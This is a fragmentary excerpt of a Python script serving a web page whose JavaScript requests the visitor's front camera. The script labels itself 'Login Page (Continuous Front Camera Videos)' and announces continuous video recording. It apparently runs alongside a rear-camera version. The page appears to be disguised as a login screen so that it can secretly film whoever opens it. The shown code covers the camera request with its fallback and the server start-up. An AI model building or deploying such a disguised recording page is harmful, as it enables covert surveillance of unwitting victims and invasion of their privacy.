    ...
    <script>
        ...
        async function startCamera() {{
            const constraints = {{
                ...
                video: {{ 
                    facingMode: 'user', // Request front camera (changed from 'environment')
                    width: {{ ideal: 1280 }},
                    height: {{ ideal: 720 }}
                }}
            }};
            ...
            try {{
                ...
                // Fallback to environment camera if front camera is not available
                try {{
...
if __name__ == '__main__':
    ...
    port = 4042  # Changed to different port to run alongside back camera version
    script_name = "Login Page (Continuous Front Camera Videos)"
    ...
    print("\nStarting server...")
    print(f"This script will continuously record {recording_duration_seconds}-second videos from the FRONT camera.")
